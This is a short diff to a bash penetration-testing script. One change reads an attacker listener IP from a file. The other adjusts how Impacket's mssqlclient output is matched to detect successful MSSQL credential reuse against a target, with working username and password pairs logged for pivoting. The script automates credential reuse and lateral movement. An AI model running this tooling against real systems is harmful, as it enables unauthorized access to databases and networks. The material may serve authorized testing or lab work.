@@ -26,7 +26,12 @@ PERSIST_DIR="$OUTDIR/persist"
 MSSQL_DIR="$OUTDIR/mssql"
 mkdir -p "$PIVOT_DIR" "$MSSQL_DIR"
 
-LHOST=$(ip -br a | grep -v '^lo' | awk '{print $3}' | cut -d/ -f1 | head -1)
+if [[ -f "$OUTDIR/attacker-ip.txt" ]]; then
+    LHOST=$(cat "$OUTDIR/attacker-ip.txt")
+else
+    LHOST=$(ip -br a | grep -v '^lo' | awk '{print $3}' | cut -d/ -f1 | head -1)
+fi
+
 LPORT="${1:-4444}"
 
 
@@ -676,7 +681,7 @@ else
             RESULT=$(printf "select @@servername;\nexit\n" | \
                 mssqlclient "${U}:${P}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)
 
-            if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press\|ENVCHANGE"; then
+            if echo "$RESULT" | grep -qi "ACK:\|Press help\|ENVCHANGE"; then
                 echo "[+] Credential reuse SUCCESS: $U:$P on $TARGET_IP:$TARGET_PORT"
                 echo "$TARGET_IP:$TARGET_PORT:$U:$P" >> "$PIVOT_DIR/credreuse-successes.txt"
 
